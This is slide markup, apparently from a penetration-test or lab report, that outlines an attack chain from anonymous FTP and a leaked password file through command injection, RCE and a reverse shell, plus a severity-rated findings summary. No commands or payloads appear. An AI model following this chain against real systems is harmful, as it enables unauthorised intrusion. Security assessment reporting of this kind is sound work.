            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="1463040"/>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Anonymous FTP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8970264" y="1463040"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9043416" y="1463040"/>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webpass.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2231136"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="2231136"/>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Web Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="2231136"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="2231136"/>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Hidden ?path=</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="2231136"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="2231136"/>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OS Command Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8970264" y="2231136"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9043416" y="2231136"/>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RCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2999232"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="2999232"/>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Reverse Shell (www-data)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="2999232"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="2999232"/>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Source Code Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="2999232"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="2999232"/>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Hardcoded Credentials</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8970264" y="2999232"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9043416" y="2999232"/>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Valid Login</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3767328"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="3767328"/>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Admin/Profile Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="3767328"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="3767328"/>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Broken Access Control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="3767328"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="3767328"/>
            <a:ext cx="2551176" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reflected XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8970264" y="3767328"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="6B7280"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9043416" y="3767328"/>
            <a:ext cx="2551176" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privilege Escalation Assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4535424"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="6B7280"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="4535424"/>
            <a:ext cx="2551176" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No Root Achieved</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="6080760"/>
            <a:ext cx="1856232" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 166667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="22C55E"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="6080760"/>
            <a:ext cx="1856232" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CONFIRMED PATH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="6080760"/>
            <a:ext cx="2651760" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 166667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6B7280"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="6080760"/>
            <a:ext cx="2651760" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>INVESTIGATED — NOT ACHIEVED</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22</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11 · SUMMARY</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Final Findings &amp; Risk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="2697480" cy="3794760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2712"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="2697480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF4444"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="2697480" cy="45720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CRITICAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2011680"/>
            <a:ext cx="2368296" cy="3108960"/>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100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OS Command Injection / RCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3364992" y="1417320"/>
            <a:ext cx="2697480" cy="3794760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2712"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3364992" y="1417320"/>
            <a:ext cx="2697480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F97316"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3364992" y="1417320"/>
            <a:ext cx="2697480" cy="45720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HIGH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3529584" y="2011680"/>
            <a:ext cx="2368296" cy="3108960"/>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100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Hardcoded Credentials</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Unauthenticated Admin/Profile Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Writable SUID Binary (misconfig; exploitation unproven)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="1417320"/>
            <a:ext cx="2697480" cy="3794760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2712"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
